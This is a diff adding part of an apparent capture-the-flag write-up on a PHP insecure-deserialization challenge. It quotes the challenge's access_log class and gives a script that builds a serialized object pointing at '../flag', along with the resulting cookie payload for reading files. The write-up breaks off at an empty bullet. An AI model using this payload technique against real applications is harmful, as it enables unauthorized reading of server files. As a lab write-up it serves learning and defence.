@@ -118,4 +118,64 @@ if(isset($_COOKIE["login"])){
 
 ?>
  ```
- * The function `is_admin()` and ` is_guest()` are same check attribute username and password 
+ * The function `is_admin()` and ` is_guest()` are same check attribute username and password of `permission` class by query to database `users.db` because 2 function used `prepared statements` and `parameterized queries` so exploit sql injection is impossiable 
+ * `IF` block code check cookie of `login` if serialize true its response flag and false its response message `Deserialization error`
+ * `authentication.phps`
+ ```c
+ <?php
+
+class access_log
+{
+	public $log_file;
+
+	function __construct($lf) {
+		$this->log_file = $lf;
+	}
+
+	function __toString() {
+		return $this->read_log();
+	}
+
+	function append_to_log($data) {
+		file_put_contents($this->log_file, $data, FILE_APPEND);
+	}
+
+	function read_log() {
+		return file_get_contents($this->log_file);
+	}
+}
+
+require_once("cookie.php");
+if(isset($perm) && $perm->is_admin()){
+	$msg = "Welcome admin";
+	$log = new access_log("access.log");
+	$log->append_to_log("Logged in at ".date("Y-m-d")."\n");
+} else {
+	$msg = "Welcome guest";
+}
+?>
+```
+* Class `access_log` have 2 magic methods `__construct` and `__toString`. Method `__toString` response `read_log()`, `read_log()` will response content of file and transmisson ` constructor` of `access_log` class via ` file_get_contents` + Magic method wil execute when class create, therefore i created an object `access_log` 
+```c
+<?php
+
+class access_log {
+	public $log_file;
+}
+
+$object = new access_log;
+
+$object->log_file = "../flag";
+
+$serializedObject = serialize($object);
+
+echo $serializedObject;
+
+?>
+```
+* The script when i run 
+![image](https://user-images.githubusercontent.com/79050415/152373825-40d495e7-8d98-40c5-a1a0-1a4ce1041f1d.png)
+* `O:10:"access_log":1:{s:8:"log_file";s:7:"../flag";}`
+* 
+
+
